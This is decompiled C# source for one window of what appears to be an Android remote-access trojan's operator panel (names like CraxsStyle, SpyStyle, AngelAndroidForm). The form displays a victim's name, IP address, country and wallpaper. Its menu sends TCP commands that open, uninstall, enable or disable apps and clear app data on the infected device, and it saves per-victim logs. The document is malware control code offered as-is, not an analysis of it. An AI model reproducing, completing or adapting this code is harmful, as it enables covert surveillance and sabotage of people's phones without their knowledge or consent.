using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x0200002E RID: 46
[DesignerGenerated]
public partial class Applications : Form
{
	// Token: 0x060001B1 RID: 433 RVA: 0x000113C4 File Offset: 0x0000F5C4
	public Applications()
	{
		base.Load += this.Applications_Load;
		base.Activated += this.AngelAndroidForm_Activated;
		base.Deactivate += this.AngelAndroidForm_Deactivate;
		this.Title = "null";
		this.BoxTitlePaintEventArgsWait = false;
		this.InitializeComponent();
	}

	// Token: 0x060001B4 RID: 436 RVA: 0x000122E4 File Offset: 0x000104E4
	public void CraxsStyle()
	{
		string language = RegistryHandler.Get_Language();
		if (Operators.CompareString(language, "AR", false) != 0)
		{
			if (Operators.CompareString(language, "CN", false) == 0)
			{
				this.ctx.Items[0].Text = "打开";
				this.ctx.Items[1].Text = "刷新";
				this.ctx.Items[2].Text = "特性";
				this.ctx.Items[3].Text = "节省";
				this.ctx.Items[4].Text = "另存为";
				this.ctx.Items[5].Text = "卸载";
				this.ctx.Items[6].Text = "禁用";
				this.ctx.Items[7].Text = "使能够";
			}
		}
		else
		{
			this.ctx.Items[0].Text = "فتح";
			this.ctx.Items[1].Text = "تحديث";
			this.ctx.Items[2].Text = "خصائص";
			this.ctx.Items[3].Text = "حفظ";
			this.ctx.Items[4].Text = "حفظ كـ";
			this.ctx.Items[5].Text = "إلغاء التثبيت";
			this.ctx.Items[6].Text = "تعطيل";
			this.ctx.Items[7].Text = "تفعيل";
		}
	}

	// Token: 0x060001B5 RID: 437 RVA: 0x0000206C File Offset: 0x0000026C
	private void SpyStyle()
	{
	}

	// Token: 0x060001B6 RID: 438 RVA: 0x000124D4 File Offset: 0x000106D4
	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
		{
			base.Opacity += 0.1;
		}
		else
		{
			this.TOpacity.Enabled = false;
		}
	}

	// Token: 0x060001B7 RID: 439 RVA: 0x0001251C File Offset: 0x0001071C
	private void Applications_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\2.ico");
		this.CraxsStyle();
		try
		{
			this.ClientPic.Image = this.classClient.Wallpaper;
			this.clinameinfo.Text = string.Concat(new string[]
			{
				"Name: ",
				this.classClient.ClientName,
				Strings.Space(2),
				"IP: ",
				this.classClient.ClientAddressIP,
				Strings.Space(2),
				"Country: ",
				this.classClient.Country
			});
		}
		catch (Exception)
		{
		}
		this.DGV0.ColumnHeadersDefaultCellStyle.Font = reso.f;
		this.DGV0.DefaultCellStyle.Font = reso.f;
		if (Operators.CompareString(SpySettings.SAVING_DATA, "No", false) == 0)
		{
			this.SaveToolStripMenuItem.Visible = true;
			this.SaveAsToolStripMenuItem.Visible = true;
		}
		this.Text = this.Title;
		this.TOpacity.Interval = SpySettings.T_Interval;
		this.TOpacity.Enabled = true;
		this.BoxTitlePaintEventArgsWait = true;
	}

	// Token: 0x060001B8 RID: 440 RVA: 0x00012664 File Offset: 0x00010864
	private void OpenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".apps",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.resultClient,
								Data.SPL_SOCKET,
								"open",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	// Token: 0x060001B9 RID: 441 RVA: 0x000127A8 File Offset: 0x000109A8
	private void PropertiesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						object[] parametersObjects = new object[]
						{
							this.Client,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient1,
								Data.SPL_SOCKET,
								reso.domen,
								".apps",
								Data.SPL_SOCKET,
								"method",
								Data.SPL_SOCKET,
								SecurityKey.AppsProperties,
								Data.SPL_SOCKET,
								"properties",
								Data.SPL_DATA,
								text
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	// Token: 0x060001BA RID: 442 RVA: 0x000128EC File Offset: 0x00010AEC
	private void SaveAsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		SaveFileDialog saveFileDialog = new SaveFileDialog();
		saveFileDialog.FileName = DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html";
		saveFileDialog.Filter = "html (*.html)|*.html";
		if (saveFileDialog.ShowDialog() == DialogResult.OK)
		{
			ThreadPool.QueueUserWorkItem(delegate(object a0)
			{
				reso.SAVEit((Array)a0);
			}, new object[]
			{
				this.DGV0,
				"null",
				saveFileDialog.FileName,
				this.tmpClientName,
				this.tmpCountry + " - " + this.tmpAddressIP,
				"Applications",
				"log",
				"null"
			});
		}
		saveFileDialog.Dispose();
	}

	// Token: 0x060001BB RID: 443 RVA: 0x000129C0 File Offset: 0x00010BC0
	private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
	{
		reso.Directory_Exist(this.classClient);
		ThreadPool.QueueUserWorkItem(delegate(object a0)
		{
			reso.SAVEit((Array)a0);
		}, new object[]
		{
			this.DGV0,
			this.tmpFolderUSER,
			"Applications",
			this.tmpClientName,
			this.tmpCountry + " - " + this.tmpAddressIP,
			"Applications",
			"log",
			DateAndTime.Now.ToString("yyyy-dd-M--HH-mm-ss") + ".html"
		});
	}

	// Token: 0x060001BC RID: 444 RVA: 0x00012A70 File Offset: 0x00010C70
	private void BoxTitle_Paint(object sender, PaintEventArgs e)
	{
		checked
		{
			if (this.BoxTitlePaintEventArgsWait)
			{
				int count = this.DGV0.Rows.Count;
				string str = "All " + Conversions.ToString(count);
				string str2 = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
				Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
				e.Graphics.DrawLine(new Pen(Color.FromArgb(50, (int)defaultColor_Foreground.R, (int)defaultColor_Foreground.G, (int)defaultColor_Foreground.B)), 0, 1, this.BoxTitle.Width, 1);
				Brush brush = new SolidBrush(SpySettings.DefaultColor_Foreground);
				Brush brush2 = new SolidBrush(Color.FromArgb(170, (int)this.BoxTitle.BackColor.R, (int)this.BoxTitle.BackColor.G, (int)this.BoxTitle.BackColor.B));
				Size size = TextRenderer.MeasureText(str + Strings.Space(10) + str2, reso.f);
				Rectangle rect = new Rectangle(0, 2, this.BoxTitle.Width, size.Height + 5);
				e.Graphics.FillRectangle(new Pen(brush2).Brush, rect);
				e.Graphics.DrawString(str + Strings.Space(10) + str2 + Strings.Space(10), reso.f, brush, 0f, 2f);
				Size size2 = TextRenderer.MeasureText("S", reso.f);
				if (this.BoxTitle.Height != size2.Height + 3)
				{
					this.BoxTitle.Height = size2.Height + 3;
				}
			}
		}
	}

	// Token: 0x060001BD RID: 445 RVA: 0x0000233A File Offset: 0x0000053A
	private void AngelAndroidForm_Activated(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060001BE RID: 446 RVA: 0x0000233A File Offset: 0x0000053A
	private void AngelAndroidForm_Deactivate(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060001BF RID: 447 RVA: 0x0000233A File Offset: 0x0000053A
	private void BoxTitle_Resize(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060001C0 RID: 448 RVA: 0x00012C3C File Offset: 0x00010E3C
	private void RefreshToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (this.classClient != null)
		{
			object[] parametersObjects = new object[]
			{
				this.Client,
				string.Concat(new string[]
				{
					SecurityKey.KeysClient1,
					Data.SPL_SOCKET,
					reso.domen,
					".apps",
					Data.SPL_SOCKET,
					"method",
					Data.SPL_SOCKET,
					SecurityKey.Apps,
					Data.SPL_SOCKET,
					"load",
					Data.SPL_DATA,
					"y"
				}),
				Codes.Encoding().GetBytes("null"),
				this.classClient
			};
			this.classClient.SendMessage(parametersObjects);
		}
	}

	// Token: 0x060001C1 RID: 449 RVA: 0x00012D00 File Offset: 0x00010F00
	private void UninstallToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"SFD<*>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	// Token: 0x060001C2 RID: 450 RVA: 0x00012EA8 File Offset: 0x000110A8
	private void ClearAppDataToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"CRD<*>E>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	// Token: 0x060001C3 RID: 451 RVA: 0x00013050 File Offset: 0x00011250
	private void EnableToolStripMenuItem_Click(object sender, EventArgs e)
	{
		checked
		{
			if (this.DGV0.SelectedRows.Count > 0)
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[2].Value);
					if (this.classClient != null)
					{
						TcpClient myClient = this.classClient.myClient;
						string[] array = this.classClient.Keys.Split(new char[]
						{
							':'
						});
						object[] parametersObjects = new object[]
						{
							myClient,
							string.Concat(new string[]
							{
								SecurityKey.KeysClient2,
								Data.SPL_SOCKET,
								"CRD<*>D>",
								text,
								Data.SPL_SOCKET,
								array[0],
								Data.SPL_SOCKET,
								array[1],
								Data.SPL_SOCKET,
								SecurityKey.Lockscreen,
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Conversions.ToString(0),
								Data.SPL_SOCKET,
								Data.SPL_ARRAY,
								Data.SPL_SOCKET,
								this.classClient.ClientRemoteAddress
							}),
							Codes.Encoding().GetBytes("null"),
							this.classClient
						};
						this.classClient.SendMessage(parametersObjects);
					}
				}
			}
		}
	}

	// Token: 0x060001C4 RID: 452 RVA: 0x0000233A File Offset: 0x0000053A
	private void DGV0_RowsRemoved(object sender, DataGridViewRowsRemovedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060001C5 RID: 453 RVA: 0x0000233A File Offset: 0x0000053A
	private void DGV0_RowsAdded(object sender, DataGridViewRowsAddedEventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x060001C6 RID: 454 RVA: 0x0000233A File Offset: 0x0000053A
	private void DGV0_SelectionChanged(object sender, EventArgs e)
	{
		this.BoxTitle.Invalidate();
	}

	// Token: 0x0400010F RID: 271
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("DGV0")]
	private DataGridView _DGV0;

	// Token: 0x04000110 RID: 272
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OpenToolStripMenuItem")]
	private ToolStripMenuItem _OpenToolStripMenuItem;

	// Token: 0x04000111 RID: 273
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveToolStripMenuItem")]
	private ToolStripMenuItem _SaveToolStripMenuItem;

	// Token: 0x04000112 RID: 274
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("SaveAsToolStripMenuItem")]
	private ToolStripMenuItem _SaveAsToolStripMenuItem;

	// Token: 0x04000113 RID: 275
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private System.Windows.Forms.Timer _TOpacity;

	// Token: 0x04000114 RID: 276
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BoxTitle")]
	private PictureBox _BoxTitle;

	// Token: 0x04000115 RID: 277
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("PropertiesToolStripMenuItem")]
	private ToolStripMenuItem _PropertiesToolStripMenuItem;

	// Token: 0x04000116 RID: 278
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	// Token: 0x04000117 RID: 279
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("UninstallToolStripMenuItem")]
	private ToolStripMenuItem _UninstallToolStripMenuItem;

	// Token: 0x04000118 RID: 280
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("ClearAppDataToolStripMenuItem")]
	private ToolStripMenuItem _ClearAppDataToolStripMenuItem;

	// Token: 0x04000119 RID: 281
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("EnableToolStripMenuItem")]
	private ToolStripMenuItem _EnableToolStripMenuItem;

	// Token: 0x0400011A RID: 282
	public TcpClient Client;

	// Token: 0x0400011B RID: 283
	public Client classClient;

	// Token: 0x0400011C RID: 284
	public string Title;

	// Token: 0x0400011D RID: 285
	public string tmpFolderUSER;

	// Token: 0x0400011E RID: 286
	public string tmpClientName;

	// Token: 0x0400011F RID: 287
	public string tmpCountry;

	// Token: 0x04000120 RID: 288
	public string tmpAddressIP;

	// Token: 0x04000121 RID: 289
	private bool BoxTitlePaintEventArgsWait;
}
